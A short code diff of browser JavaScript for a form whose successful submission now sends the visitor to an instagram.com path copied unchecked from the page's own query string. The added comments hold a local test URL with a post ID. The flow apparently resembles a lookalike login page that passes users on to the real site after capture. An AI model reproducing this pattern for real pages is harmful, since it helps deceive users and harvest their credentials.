@@ -1,4 +1,8 @@
-// console.log('qwerty')
+// 127.0.0.1/instagram?a=CEzxS7VHHNZEFVm-tb1FJP3WFv0y9hKpfPcDwE0/
+// instaformat ins/q/CEzxS7VHHNZEFVm-tb1FJP3WFv0y9hKpfPcDwE0/
+// CEzxS7VHHNZEFVm-tb1FJP3WFv0y9hKpfPcDwE0/
+
+
 function errorMess(mess) {
     document.getElementById('error').style.display = 'block'
     if (mess == 'username') {
@@ -86,7 +90,8 @@ form.addEventListener('submit', (e) => {
         .then(res => {
             if (res.status == 200) {
                 console.log('username-ok')
-                window.location.href = "/success";
+                redirectlink = `https://www.instagram.com/${window.location.href.split('?')[1]}`
+                window.location.href = redirectlink
             } else {
                 console.log('username-err')
                 errorMess('username')
